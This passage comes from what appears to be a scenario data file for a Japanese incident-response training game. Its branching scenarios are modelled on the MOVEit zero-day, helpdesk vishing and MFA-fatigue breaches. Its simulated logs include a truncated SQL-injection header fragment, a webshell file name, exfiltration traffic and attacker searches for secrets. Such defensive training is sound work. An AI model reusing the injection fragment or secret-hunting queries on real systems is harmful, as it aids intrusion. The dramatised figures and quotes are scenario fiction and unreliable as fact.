            label: 'ヘルプデスクでの「人事登録携帯へのビデオ/音声コールバック検証」および「上長承認（Dual-Custody）」をシステム強制化',
            actionType: 'remediation',
            timeCostMinutes: 45,
            description: 'ヘルプデスクが電話口の申告だけでMFAやパスワードをリセットすることをシステム的に禁止。人事マスタの電話番号へ逆発信するか、Teams/Zoomビデオ対面での顔写真付き社員証提示を必須化する。',
            tacticalRationale: 'Vishing攻撃を根本から無力化する決定打。攻撃者がどれだけLinkedIn等のOSINT情報を持っていても、会社登録済みの実端末への逆発信やビデオ対面確認は突破できない。',
            isOptimal: true,
            impact: { spread: -15, exfiltration: -10, downtime: 0, trust: +15 },
            logOutput: [
              '[POLICY DEPLOY] Helpdesk admin console now requires dual approval from Security Team for any MFA modification.',
              '[SOP] Inbound caller verification must use registered HR mobile callback.',
              '[TRAINING] Emergency awareness bulletin on Vishing/Helpdesk impersonation broadcasted.'
            ],
            nextNodeId: 'hd_03_terminal_secured_s'
          }
        ]
      },

      hd_02_idp_takeover: {
        id: 'hd_02_idp_takeover',
        phase: 'Phase 2: IdP特権掌握とクラウド全インフラ侵害 (T+01:15)',
        title: 'Oktaスーパー管理者奪取によるAWS・社内サーバー制圧',
        description: 'Slackでの安易な確認により時間的猶予を与えた結果、攻撃者は裏口スーパー管理者アカウントを作成。Okta経由でAWS IAM、GitHub、Google Workspaceの最高特権を掌握し、社内インフラの全面的な乗っ取りを宣言しました。',
        severity: 'critical',
        situationSummary: '企業アイデンティティ基盤の完全崩壊。全社インフラの主導権喪失。',
        telemetryLogs: [
          { timestamp: '16:00:00', source: 'AWS CloudTrail', level: 'CRITICAL', message: 'Root/Admin user created 12 EC2 c5.metal mining instances across us-east-1 and eu-central-1' },
          { timestamp: '16:15:30', source: 'Google Workspace Audit', level: 'CRITICAL', message: 'Mass mailbox takeout initiated for Board of Directors accounts' }
        ],
        choices: [
          {
            id: 'c2_emergency_breakglass_cut',
            label: '非常用Break-GlassアカウントによるIdPフェデレーション強制遮断・AWS全ルートキー失効・危機管理対策本部設置',
            actionType: 'containment',
            timeCostMinutes: 90,
            description: 'クラウドとのSSO連携を全切断し、完全オフラインの物理金庫保管クレデンシャルを用いて手動で奪還を試みる。',
            tacticalRationale: '被害は莫大だが、インフラの全面消去を防ぐための最終非常手段。外部インシデントレスポンス専門ファームの支援を取り付ける。',
            isOptimal: true,
            impact: { spread: 10, exfiltration: 30, downtime: 50, trust: -45 },
            logOutput: [
              '[BREAKGLASS] Hardware security key used to revoke Okta federation.',
              '[AWS] Account root emergency lockdown triggered with AWS Support.',
              '[CISO] External forensic response firm Mandiant/CrowdStrike engaged.'
            ],
            nextNodeId: 'hd_03_terminal_breached_f'
          }
        ]
      },

      hd_02_hotel_outage: {
        id: 'hd_02_hotel_outage',
        phase: 'Phase 2: 基幹ホスト暗号化と事業全面麻痺 (T+02:00)',
        title: 'ESXiハイパーバイザー暗号化とホテルリゾート全面営業停止',
        description: '対応の遅れにより、攻撃者は社内仮想化基盤（vCenter/ESXi）に侵入し、全仮想マシンを一斉暗号化。ホテルの客室カードキーシステム、フロント決済端末、予約管理システムが全て停止し、チェックイン待ちの宿泊客数千人がロビーに滞留する大混乱に発展しました。',
        severity: 'critical',
        situationSummary: '事業継続不可能。全リゾート施設がオフライン化、巨額の損害賠償リスク。',
        telemetryLogs: [
          { timestamp: '17:00:00', source: 'vCenter', level: 'CRITICAL', message: 'All ESXi datastores encrypted. Ransom note displayed on host consoles: "Scattered Spider / ALPHV"' }
        ],
        choices: [
          {
            id: 'c2_paper_operation_bcp',
            label: '紙運用BCPの発動・全施設への警備員配置と手動鍵対応・公的機関への被害届提出',
            actionType: 'remediation',
            timeCostMinutes: 120,
            description: '物理的な紙台帳運用に切り替え、顧客安全を最優先にしつつシステム復旧を目指す。',
            tacticalRationale: '実店舗・リゾートの現場混乱を収拾するための苦渋の決断。',
            isOptimal: true,
            impact: { spread: 20, exfiltration: 20, downtime: 60, trust: -50 },
            logOutput: [
              '[BCP] Manual paper check-in protocol activated across all hotels.',
              '[SECURITY] Physical security deployed to escort guests with master brass keys.',
              '[FBI] Cyber Division informed of ransomware extortion event.'
            ],
            nextNodeId: 'hd_03_terminal_breached_f'
          }
        ]
      },

      hd_03_terminal_secured_s: {
        id: 'hd_03_terminal_secured_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】IdP即時セッション切断と本人確認プロトコル刷新による完全防衛',
        description: '「役員アカウントに対する不審なMFA変更」を検知した瞬間、相手が役員であっても躊躇せず即座にセッション全破棄とアカウント凍結を実行。横展開をミリ秒単位で阻止し、ヘルプデスクのVishing対策を組織的に確立しました。',
        severity: 'contained',
        situationSummary: '特権奪取被害: ゼロ。クラウドサービス侵害: ゼロ。アイデンティティ防衛成功。',
        telemetryLogs: [
          { timestamp: '16:00:00', source: 'CSIRT Command', level: 'INFO', message: 'Incident closed. Scattered Spider social engineering attack completely neutralized.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: 'アイデンティティ（IdP）を標的とした最新ソーシャルエンジニアリングの完封',
          summary: '「Slack等の同一チャット基盤で確認せず即時セッション切断」「人事マスタへの登録番号コールバック徹底」という現代ゼロトラスト・ID統制の鉄則を完遂しました。',
          financialEstimate: '被害損害額: 0円 / 阻止損失額: 約120億円（MGM社が被ったとされる営業利益損失・修復費用・身代金要求額）',
          legalImpact: '顧客データ流出なし。株主代表訴訟リスクの完全回避。',
          complianceStatus: 'NIST CSF v2.0 (PR.AC-01 / PR.AT-01) 適合',
          recommendedPractices: [
            'ITヘルプデスクによるMFAリセットやパスワード再発行は「自己完結」させず、必ずセキュリティ担当または上位管理者との2者承認（Dual Approval）とする',
            '本人確認は「相手からかかってきた電話」を信用せず、必ず会社の人事台帳に登録された電話番号への逆架電（コールバック）を義務付ける',
            '役員や特権管理者のアカウントには「フィッシング耐性MFA（FIDO2 / パスキー）」のみを許可し、SMSやプッシュ通知などの弱固認証への降格（ダウングレード）を禁止する'
          ]
        }
      },

      hd_03_terminal_breached_f: {
        id: 'hd_03_terminal_breached_f',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Fランク】IdP陥落による全社システム制圧と壊滅的営業停止',
        description: 'ヘルプデスクの甘い本人確認と、初動での安易なチャット確認の遅れにより、アイデンティティ基盤（Okta）が完全に掌握されました。結果として全社クラウドインフラおよび施設基盤が乗っ取られ、数百億円規模の事業損失と信用失墜に至りました。',
        severity: 'critical',
        situationSummary: '企業ブランドの失墜。数週間にわたる営業停止と天文学的復旧費用。',
        telemetryLogs: [
          { timestamp: '18:00:00', source: 'SEC Form 8-K', level: 'CRITICAL', message: 'Material Cybersecurity Incident disclosure filed with Securities and Exchange Commission.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'F',
          title: '電話1本から始まった全社アイデンティティ崩壊',
          summary: '最新の攻撃者は技術的脆弱性だけでなく、「人間の心理とヘルプデスクの親切心」を突いてきます。アイデンティティ管理における手順の形骸化が最大のリスク要因となりました。',
          financialEstimate: '被害損害額: 約110億円（施設停止損失・復旧費用・訴訟費用・ブランド棄損）',
          legalImpact: 'SEC 8-K開示義務違反調査、株主による集団代表訴訟。',
          complianceStatus: '全社コンプライアンス監査の大規模不適合',
          recommendedPractices: [
            'ヘルプデスク業務を「外注任せ」にせず、厳格なセキュリティ手順と抜き打ち訓練（ソーシャルエンジニアリングテスト）を定期実施する',
            'シングルサインオン(SSO)を導入している場合、IdPの管理アカウントは最も強固に防衛すべき「クラウンジュエル」として最優先保護する'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_mft_moveit',
    title: 'MFTファイル転送基盤 ゼロデイSQLi & 暗号化なし一括データ恐喝',
    subtitle: '実在モデル: 2023年 MOVEit Transfer (CVE-2023-34362) / CL0P グループ一斉データ流出事件',
    difficulty: '上級 (インシデントコマンダー)',
    category: 'Zero-Day & Perimeter',
    estimatedTime: '15〜20分',
    initialNodeId: 'mft_01_alert',
    initialMetrics: {
      spread: 25,
      exfiltration: 45,
      downtime: 10,
      trust: 80,
    },
    briefing: {
      targetOrganization: '大手信託銀行 & 人事給与BPOサービス企業（受託顧客企業820社、対象従業員140万人）',
      discoveredAlert: 'インターネット公開中のファイル転送サーバー [MFT-PROD-01] にて、guestaccess.aspx への異常なSQLインジェクションリクエストと、直後の human2.aspx（WebShell）生成、および450GB超のアウトバウンド通信を検知。',
      incidentOfficer: 'CISO室 サイバー危機管理責任者',
      immediateObjective: 'MFTアプライアンスの即時外部通信遮断、流出データ範囲（マイナンバー・給与・口座情報）の特定、個人情報保護委員会への3日以内報告、および暴露脅迫（二重恐喝）への非金銭的対応。',
    },
    imagePath: '/src/assets/images/scenario_mft_moveit_1793938161801.jpg',
    nodes: {
      mft_01_alert: {
        id: 'mft_01_alert',
        phase: 'Phase 1: MFTアプライアンスでのゼロデイSQLi検知 (T+00:00)',
        title: 'guestaccess.aspxへのSQLiとhuman2.aspx WebShellの生成',
        description: '早朝05時14分、SOCのネットワークトラフィック分析において、顧客との機密ファイル送受信に利用しているMFTアプライアンス [MFT-PROD-01] から、未知の海外ホスティングサーバー宛てに450GBを超える大容量データがHTTPS経由でアップロードされているのを検知しました。サーバー内には未定義のファイル human2.aspx が作成されています。',
        severity: 'critical',
        situationSummary: '攻撃者はファイルを暗号化せず、MFT内部に蓄積された顧客企業の給与明細・マイナンバー・健康診断データのみを大量吸い上げ中。',
        telemetryLogs: [
          { timestamp: '05:14:02', source: 'Zeek Network Monitor', level: 'CRITICAL', message: 'Massive outbound HTTPS flow: 462.8 GB transferred to 198.51.100.44:443 in 38 minutes' },
          { timestamp: '05:15:30', source: 'Windows File System', level: 'CRITICAL', message: 'New file created: C:\\\\MOVEitTransfer\\\\wwwroot\\\\human2.aspx (Hash: e3b0c442...)' },
          { timestamp: '05:16:00', source: 'IIS W3C Log', level: 'ALERT', message: 'POST /guestaccess.aspx query="X-MOVEit-Embedded: \';INSERT INTO active_sessions..." HTTP 200' }
        ],
        choices: [
          {
            id: 'c1_isolate_mft_firewall_dump',
            label: 'MFTサーバー宛ての全外部インバウンド/アウトバウンド通信をFirewall/DNSで即座に遮断 & human2.aspx とDBクエリログを法廷フォレンジック保全',
            actionType: 'containment',
            timeCostMinutes: 5,
            description: 'データ吸い上げ通信をネットワーク境界で物理的に断ち切り、これ以上の情報漏洩をストップ。同時にWebShellファイルと揮発性メモリ・IISログを完全保全する。',
            tacticalRationale: '最善の初動。CL0P等のゼロデイMFT攻撃は数時間ですべての機密データを盗み去るため、1秒を争う通信遮断が最優先。ファイルを単純削除するのではなく、流出範囲特定のためにログとWebShellのフォレンジック保全を即座に行う。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -20, downtime: 10, trust: 0 },
            logOutput: [
              '[FIREWALL] IP 198.51.100.44 BLOCKED. Inbound/Outbound traffic to MFT-PROD-01 DROPPED.',
              '[SOC] Outbound data exfiltration halted at 462.8 GB.',
              '[FORENSICS] Memory dump and human2.aspx secured with SHA-256 hash verification.'
            ],
            nextNodeId: 'mft_02_leak_scope_and_ppc'
          },
          {
            id: 'c1_delete_file_gui',
            label: 'サーバーの通信はそのまま維持し、リモートデスクトップでログインして human2.aspx をエクスプローラーからゴミ箱へ削除する',
            actionType: 'containment',
            timeCostMinutes: 15,
            description: '不審なファイルだけを消去して通常業務を継続させようとする。',
            tacticalRationale: '悪手。WebShellをファイルシステムから消しても、IISのメモリ空間（w3wp.exe）に既に悪意のセッションが常駐している場合、別名でバックドアが再生成される。また、外部通信が生きているため残りの未吸い上げDBが流出し続ける。',
            impact: { spread: 25, exfiltration: 30, downtime: 5, trust: -20 },
            logOutput: [
              '[ADMIN] File human2.aspx deleted from wwwroot.',
              '[ATTACKER] w3wp.exe in-memory session regenerated backdoor as human3.aspx.',
              '[ZEEK] Additional 820 GB exfiltrated to secondary IP 203.0.113.88.'
            ],
            nextNodeId: 'mft_02_full_exfiltration'
          },
          {
            id: 'c1_keep_open_for_customers',
            label: '「朝の給与データ確定業務が止まると大問題になる」と判断し、翌週末の定期メンテまで稼働を続けさせる',
            actionType: 'remediation',
            timeCostMinutes: 45,
            description: '業務停止のクレームを恐れ、侵害サーバーをインターネットに公開したままにする。',
            tacticalRationale: '壊滅的判断。数時間ですべての受託企業820社・140万人分のマイナンバーや口座情報がダークウェブへ持ち去られ、後に数百億円の賠償責任と社会的制裁を受ける。',
            impact: { spread: 45, exfiltration: 50, downtime: 20, trust: -45 },
            logOutput: [
              '[CL0P LEAK SITE] Threat actor published: "We downloaded 4.2 Terabytes from TrustBank BPO. All 820 client company records captured."',
              '[DISASTER] Full database dump completed by adversary.'
            ],
            nextNodeId: 'mft_02_mass_blackmail'
          }
        ]
      },

      mft_02_leak_scope_and_ppc: {
        id: 'mft_02_leak_scope_and_ppc',
        phase: 'Phase 2: 流出範囲特定 & 個人情報保護委員会報告 (T+02:00)',
        title: 'SQLクエリログ分析による被害範囲特定と公的届出',
        description: '迅速な通信遮断により、全体の約15%のデータ流出時点で攻撃を阻止。保全したSQL監査ログの精査により、流出した462GBに含まれる対象企業（820社中110社）と対象個人（約18万人）の特定が完了しました。暗号化は一切行われておらず、暴露型恐喝（Exfiltration-only）の手口であることが判明。',
        severity: 'high',
        situationSummary: '流出拡大は停止。特定された110社への緊急個別通知と、個人情報保護委員会への72時間以内速報が義務付けられる。',
        telemetryLogs: [
          { timestamp: '07:30:00', source: 'Forensics Tool', level: 'INFO', message: 'Decrypted IIS log indicates SQL query targeted: SELECT filepath, client_id FROM files WHERE date >= 2026-10-01' },
          { timestamp: '07:45:10', source: 'Legal Counsel', level: 'WARN', message: 'Act on the Protection of Personal Information: Initial notification due within 3 to 5 days.' }
        ],
        choices: [
          {
            id: 'c2_report_ppc_notify_clients',
            label: '個人情報保護委員会へ速報を即時提出・対象110社へ個別連絡・MFTアプライアンスを最新ベンダーパッチ版へ完全置換',
            actionType: 'communication',
            timeCostMinutes: 60,
            description: '被害範囲を隠さず正確に開示し、専用コールセンターを立ち上げて対象企業・個人へのケアを実施。システムはゼロトラスト要件を満たす安全な新環境へ刷新する。',
            tacticalRationale: 'コンプライアンスおよび危機管理上の最善手。正確な流出範囲を把握して迅速に公式発表することで、ダークウェブでの脅迫要求（身代金支払い）に応じることなく、信頼回復への道筋をつける。',
            isOptimal: true,
            impact: { spread: -5, exfiltration: -5, downtime: 15, trust: +15 },
            logOutput: [
              '[LEGAL] PPC initial report submitted successfully within 12 hours.',
              '[CLIENTS] Direct crisis briefing held with 110 affected enterprise clients.',
              '[SYSTEM] Replaced on-prem MFT with hardened Zero-Trust MFT architecture with IP allowlisting.'
            ],
            nextNodeId: 'mft_03_terminal_secured_s'
          }
        ]
      },

      mft_02_full_exfiltration: {
        id: 'mft_02_full_exfiltration',
        phase: 'Phase 2: 大容量データ持ち出し完了と身代金恐喝要求 (T+04:00)',
        title: '全顧客データ流出とダークウェブでの身代金恐喝',
        description: '初動でのファイル単純削除が失敗し、攻撃者は合計1.8TBのデータを完全に吸い上げました。攻撃者グループ「CL0P」から企業の代表メール宛てに「7日以内に1,500万ドルのビットコインを支払わなければ、受託企業全社のマイナンバーをリークサイトで公開する」との脅迫状が届きました。',
        severity: 'critical',
        situationSummary: '140万人分のデータ完全流出。ダークウェブ上でのカウントダウン開始。',
        telemetryLogs: [
          { timestamp: '09:00:00', source: 'Adversary Email', level: 'CRITICAL', message: 'Ransom demand: 15,000,000 USD in BTC. Proof files attached: 50 Executive salaries & Tax IDs' }
        ],
        choices: [
          {
            id: 'c2_refuse_ransom_public_disclosure',
            label: '身代金支払いを毅然と拒絶・警察庁サイバー特捜隊および個人情報保護委員会へ全面報告・緊急記者会見の実施',
            actionType: 'communication',
            timeCostMinutes: 90,
            description: '犯罪組織への資金提供を拒絶し、公的機関と連携して被害者救済（信用情報監視サービス等の無償提供）を実施する。',
            tacticalRationale: '身代金を支払ってもデータ消去の保証はなく、再恐喝されるだけであるため支払いは厳禁。公表と警察連携が唯一の道。',
            isOptimal: true,
            impact: { spread: 15, exfiltration: 20, downtime: 30, trust: -35 },
            logOutput: [
              '[PRESS] Emergency press conference held by CEO & CISO.',
              '[POLICE] National Police Agency Cyber Special Investigation Unit launched probe.',
              '[SUPPORT] Credit monitoring service contracted for all affected individuals.'
            ],
            nextNodeId: 'mft_03_terminal_breached_f'
          }
        ]
      },

      mft_02_mass_blackmail: {
        id: 'mft_02_mass_blackmail',
        phase: 'Phase 2: リークサイト公開と受託契約の一斉解除 (T+06:00)',
        title: '機密情報のインターネット全公開と受託企業からの集団訴訟',
        description: '業務継続を優先した結果、全820社・140万人分のデータが何ら防護なく流出。攻撃者のリークサイトに企業リストとサンプルデータが無断公開され、受託企業各社からの抗議と契約解除通告が殺到しています。',
        severity: 'critical',
        situationSummary: '信用失墜による事業存続危機。取引先全社からの契約解除と損害賠償請求。',
        telemetryLogs: [
          { timestamp: '11:00:00', source: 'Media News', level: 'CRITICAL', message: 'Breaking: 1.4 Million Citizens Financial Records Leaked Online in Massive BPO Breach' }
        ],
        choices: [
          {
            id: 'c2_emergency_legal_defense',
            label: '全受託契約の一時停止・経営陣の引責辞職と第三者委員会による徹底調査',
            actionType: 'communication',
            timeCostMinutes: 120,
            description: '企業存続に向けた法的整理と原因究明手続きに入る。',
            tacticalRationale: '最悪の事態における最終収拾策。',
            isOptimal: true,
            impact: { spread: 25, exfiltration: 25, downtime: 50, trust: -50 },
            logOutput: [
              '[BOARD] Board of Directors resignation submitted.',
              '[LEGAL] Independent Investigation Committee chartered.'
            ],
            nextNodeId: 'mft_03_terminal_breached_f'
          }
        ]
      },

      mft_03_terminal_secured_s: {
        id: 'mft_03_terminal_secured_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】電光石火の通信遮断による被害局所化と透明性ある公的開示',
        description: '大容量外向き通信の検知からわずか5分で外部ネットワークを物理遮断し、攻撃者のデータ吸い上げを早期に阻止しました。さらに保全ログから被害対象を厳密に特定し、72時間以内の法令報告と対象顧客への誠実な事前通知を完遂しました。',
        severity: 'contained',
        situationSummary: '流出規模を全体の15%未満に抑制。二重恐喝の完全無力化。',
        telemetryLogs: [
          { timestamp: '12:00:00', source: 'CSIRT Command', level: 'INFO', message: 'MOVEit zero-day response closed. System migrated to hardened Zero-Trust portal.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: 'ゼロデイ一斉データ恐喝に対する模範的クライシスマネジメント',
          summary: '「暗号化を伴わないデータ持ち出し型恐喝」に対し、通信の物理遮断で流出を最小化し、法令に則った透明性ある開示で顧客の信頼を死守しました。',
          financialEstimate: '被害損害額: 約8,500万円（通知費用・パッチ検証費） / 阻止損失額: 約65億円（全社流出時の損害賠償・取引契約解除）',
          legalImpact: '個人情報保護法 第26条の報告義務を期限内に完全遵守。',
          complianceStatus: 'FISC安全対策基準 / ISO 27001 適合維持',
          recommendedPractices: [
            '外部公開するファイル転送アプライアンスは、インターネット全開放とせず、許可された送信元IP（IPホワイトリスト）やZTNA（ゼロトラスト・ネットワーク・アクセス）経由に限定する',
            '大容量の外向き通信（Egress Traffic Spike）をリアルタイム検知し、自動で通信を絞り込むアラート閾値を設定する',
            'データ恐喝を受けた際、犯罪組織に身代金を支払ってもデータは破棄されないことを認識し、警察・規制当局との連携を第一とする'
          ]
        }
      },

      mft_03_terminal_breached_f: {
        id: 'mft_03_terminal_breached_f',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Fランク】データ吸い上げの放置が生んだメガブリーチと事業破綻の危機',
        description: '初動での中途半端なファイル削除や業務優先判断により、1.8TBに及ぶ140万人分のマイナンバー・給与データが完全に盗まれました。ダークウェブでの暴露により受託企業からの契約解除と損害賠償請求が殺到し、企業の存続が危ぶまれる事態となりました。',
        severity: 'critical',
        situationSummary: '140万人分のデータ完全漏洩。受託契約の大量解除と巨額損害賠償。',
        telemetryLogs: [
          { timestamp: '14:00:00', source: 'Regulatory Authority', level: 'CRITICAL', message: 'Formal administrative order issued regarding systemic data governance failure.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'F',
          title: 'ファイル転送基盤のゼロデイが招いた信託・BPO事業の崩壊',
          summary: '「外向き大容量通信の放置」と「安易なGUIファイル削除」という二重の初動ミスが、歴史的なデータ漏洩事件を引き起こしました。',
          financialEstimate: '被害損害額: 約52億円（損害賠償・顧客離脱損失・信用監視費用・制裁金）',
          legalImpact: '個人情報保護法に基づく是正命令、集団訴訟、主務官庁による業務改善命令。',
          complianceStatus: '主要セキュリティ認証の取り消し処分',
          recommendedPractices: [
            'MFTやVPNなど境界に位置するアプライアンスには常に未知の脆弱性（ゼロデイ）が存在し得ることを前提とし、内部ネットワークから隔離（DMZ）する',
            '侵害が疑われるホストは即座にネットワークから切り離し、痕跡を消さないよう専門のフォレンジック手順を踏む'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_mfa_fatigue',
    title: '深夜のMFA疲労攻撃（プッシュ連打）& 社内Slack侵入・特権Vault窃取',
    subtitle: '実在モデル: 2022年 米国大手配車サービス (Uber) & 大手ゲーム開発スタジオ侵害 (Lapsus$)',
    difficulty: '中級 (実務CSIRT)',
    category: 'BEC & Phishing',
    estimatedTime: '15分',
    initialNodeId: 'mfa_01_alert',
    initialMetrics: {
      spread: 25,
      exfiltration: 20,
      downtime: 5,
      trust: 90,
    },
    briefing: {
      targetOrganization: 'グローバルWebサービス開発企業（従業員6,000名）',
      discoveredAlert: '深夜02時15分、外部委託開発エンジニアのスマートフォンに対し、Duo/OktaのMFA承認プッシュ通知が30分間で54回連続送信され、直後に「承認」ステータスが記録されたのを確認。',
      incidentOfficer: 'SOC シフトスーパーバイザー',
      immediateObjective: '侵入されたVPNセッションの強制切断、社内Slack/Confluence上での特権キー探索の封じ込め、ナンバーマッチングMFAへの緊急全社切り替え。',
    },
    imagePath: '/src/assets/images/scenario_mfa_fatigue_1793938175765.jpg',
    nodes: {
      mfa_01_alert: {
        id: 'mfa_01_alert',
        phase: 'Phase 1: 深夜の異常なMFAプッシュ連打検知 (T+00:00)',
        title: '連続54回のプッシュ通知送信と突然の承認ステータス',
        description: '深夜02時48分、外部委託先エンジニア [ext_dev_satou] のアカウントにおいて、短時間で54回におよぶMFAプッシュ通知が発行され、直後に1回「承認（Accepted）」されたログが記録されました。数分後、該当アカウントを用いて社内VPNへの接続が確立され、社内SlackおよびConfluenceへの不自然な高速クエリが開始されています。',
        severity: 'critical',
        situationSummary: '攻撃者はInfoStealerマルウェア等で事前に入手したID/PASSを使い、深夜のプッシュ連打（MFA Fatigue / Prompt Bombing）で被害者に根負け承認させた模様。',
        telemetryLogs: [
          { timestamp: '02:18:00', source: 'Okta Verify', level: 'WARN', message: 'MFA Push sent to iOS device (Attempt 1..53 rejected or timed out)' },
          { timestamp: '02:48:12', source: 'Okta Verify', level: 'ALERT', message: 'MFA Push ACCEPTED by user on attempt #54' },
          { timestamp: '02:49:05', source: 'GlobalProtect VPN', level: 'CRITICAL', message: 'User ext_dev_satou connected from residential ISP (Known TOR exit node)' },
          { timestamp: '02:51:30', source: 'Slack Audit Logs', level: 'ALERT', message: 'Search queries: "AWS_SECRET", "admin_password", "ssh_key" executed by ext_dev_satou' }
        ],
        choices: [
          {
            id: 'c1_kill_vpn_revoke_account',
            label: '該当アカウントのActive Directory/VPNセッションを即時強制切断 & アカウント一時停止・全社Slack検索監査',
            actionType: 'containment',
            timeCostMinutes: 5,
            description: '侵入者のVPNトンネルを即座に破棄し、Active DirectoryおよびIdPアカウントを無効化。社内情報探索を即時遮断する。',
            tacticalRationale: '最善の初動。MFA疲労攻撃の目的は社内ネットワークへの足がかり確保であり、侵入後すぐにSlackやWiki内の認証情報を物色するため、1秒でも早いセッション切断が被害を最小化する。',
            isOptimal: true,
            impact: { spread: -15, exfiltration: -15, downtime: 0, trust: +5 },
            logOutput: [
              '[VPN] Disconnected tunnel for ext_dev_satou (Session killed).',
              '[AD] User ext_dev_satou account disabled in Active Directory.',
              '[SLACK] Enterprise Grid user session revoked. Search query export initiated.'
            ],
            nextNodeId: 'mfa_02_enforce_number_matching'
          },
          {
            id: 'c1_ask_slack_next_morning',
            label: '「深夜なので委託先に電話するのは失礼」と判断し、翌朝9時にSlackで確認連絡を入れることにして様子見',
            actionType: 'investigation',
            timeCostMinutes: 30,
            description: '就寝中のユーザーに配慮し、翌営業日の対応とする。',
            tacticalRationale: '致命的な過失。Uberの実際のインシデントでは、攻撃者が社内Slackに入り込み、社内ネットワークドライブから特権アクセス管理（PAM）ツールのマスター認証情報を発見してインフラ全体を完全制圧した。',
            impact: { spread: 40, exfiltration: 45, downtime: 20, trust: -30 },
            logOutput: [
              '[SLACK] Attacker posted in #general: "I announce I am a hacker and Uber has suffered a data breach."',
              '[CONFLUENCE] PowerShell script containing AWS root credentials downloaded by attacker.',
              '[AWS IAM] Complete cloud environment compromised!'
            ],
            nextNodeId: 'mfa_02_infrastructure_takeover'
          },
          {
            id: 'c1_change_password_only',
            label: 'VPNは切断せず、管理コンソールからパスワード変更通知メールだけを送信する',
            actionType: 'containment',
            timeCostMinutes: 20,
            description: 'パスワードだけを変えて、既存のVPN接続セッションはそのまま放置する。',
            tacticalRationale: '無効な初動。すでに確立しているVPNトンネルやOAuthトークンはパスワード変更だけでは切断されないため、攻撃者はそのまま活動を継続できる。',
            impact: { spread: 30, exfiltration: 25, downtime: 5, trust: -15 },
            logOutput: [
              '[AD] Password updated for ext_dev_satou.',
              '[VPN] Active session is still established (Session token not invalidated).',
              '[SECRETS] Attacker exfiltrated internal Git repositories.'
            ],
            nextNodeId: 'mfa_02_secrets_exfiltration'
          }
        ]
      },

      mfa_02_enforce_number_matching: {
        id: 'mfa_02_enforce_number_matching',
        phase: 'Phase 2: ナンバーマッチングMFA強制 & Slackシークレット監査 (T+00:30)',
        title: '2桁数値入力（Number Matching）の全社強制適用と認証情報ローテーション',
        description: 'VPN切断により攻撃者を社内ネットワークから即座に排除。Slackログ監査の結果、攻撃者が閲覧したチャンネルと検索履歴の特定に成功しました。閲覧された可能性がある開発環境のAWS一時キーを直ちに無効化し、今後のMFA疲労攻撃を根本防止する対策が求められます。',
        severity: 'high',
        situationSummary: '攻撃者の足がかりは排除済み。単純タップ式MFAの廃止と、漏洩疑いのあるシークレットのローテーションが必要。',
        telemetryLogs: [
          { timestamp: '03:10:00', source: 'Slack Audit', level: 'INFO', message: 'ext_dev_satou viewed 3 channels: #dev-infra, #general, #alerts before termination' },
          { timestamp: '03:15:22', source: 'Identity Admin', level: 'INFO', message: 'Okta / Microsoft Authenticator Number Matching policy available for deployment' }
        ],
        choices: [
          {
            id: 'c2_rollout_number_matching_rotate',
            label: '全社MFAポリシーを「単純タップ承認」から「画面表示の2桁数値入力（Number Matching）」へ即時強制切り替え & 閲覧された全シークレットのローテーション',
            actionType: 'remediation',
            timeCostMinutes: 40,
            description: 'ユーザーがPC画面に表示された数字をスマホに入力しない限り承認できない仕様に変更。攻撃者からの一方的なプッシュ連打を物理的に無意味化する。',
            tacticalRationale: 'MFA疲労攻撃の根本的解決策。PC画面が見えていない攻撃者がプッシュを送っても、ユーザー側には入力すべき数字が分からないため、誤タップによる誤承認が100%不可能になる。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -10, downtime: 0, trust: +15 },
            logOutput: [
              '[IDP] Number Matching (2-digit verification code) ENFORCED globally for all 6,000 users.',
              '[PUSH RATE LIMIT] Max 3 push notifications per 15 minutes before account auto-lock.',
              '[AWS/GITHUB] All API tokens mentioned in #dev-infra regenerated.'
            ],
            nextNodeId: 'mfa_03_terminal_secured_s'
          }
        ]
      },

      mfa_02_infrastructure_takeover: {
        id: 'mfa_02_infrastructure_takeover',
        phase: 'Phase 2: 全社Slackハイジャックと特権基盤の喪失 (T+01:00)',
        title: '全社Slack上での犯行声明とクラウド全権掌握',
        description: '対応を先送りにした結果、攻撃者は社内ネットワーク共有フォルダーにあったPowerShellスクリプトからハードコードされたThycotic/CyberArk（PAM特権アクセス管理）のマスターパスワードを発見。全社Slackの#generalチャンネルに「全システムを掌握した」と投稿され、全社員がパニックに陥りました。',
        severity: 'critical',
        situationSummary: '壊滅的侵害。社内コミュニケーション・クラウドインフラの全権を喪失。',
        telemetryLogs: [
          { timestamp: '03:45:00', source: 'Slack #general', level: 'CRITICAL', message: 'Post from attacker: "Hello @here, I am in your network. Ransom demands will follow."' },
          { timestamp: '03:50:00', source: 'PAM Vault', level: 'CRITICAL', message: 'Master emergency admin key exported by unknown external session' }
        ],
        choices: [
          {
            id: 'c2_cut_all_vpn_rebuild',
            label: '全社リモートアクセス即時切断・Slackワークスペース一時停止・外部フォレンジック専門家の緊急招集',
            actionType: 'containment',
            timeCostMinutes: 90,
            description: '全社業務を全面停止して感染の完全隔離を行い、外部支援のもとでゼロから特権アカウントを再構築する。',
            tacticalRationale: '損害は極めて甚大だが、これ以上の機密破壊を防ぐための最終選択。',
            isOptimal: true,
            impact: { spread: 15, exfiltration: 25, downtime: 50, trust: -45 },
            logOutput: [
              '[FIREWALL] Global VPN concentrators powered down.',
              '[SLACK] Enterprise workspace put into maintenance hold.',
              '[BOARD] Emergency Crisis Management Committee convened.'
            ],
            nextNodeId: 'mfa_03_terminal_breached_f'
          }
        ]
      },

      mfa_02_secrets_exfiltration: {
        id: 'mfa_02_secrets_exfiltration',
        phase: 'Phase 2: 既存セッション悪用によるソースコード流出 (T+00:45)',
        title: 'パスワード変更をすり抜けたソースコード大量流出',
        description: 'パスワードだけを変更してVPNセッションを切断しなかったため、攻撃者はアクティブな接続を維持。社内GitHub Enterpriseから基幹サービスのソースコードリポジトリを丸ごとクローンして持ち出しました。',
        severity: 'critical',
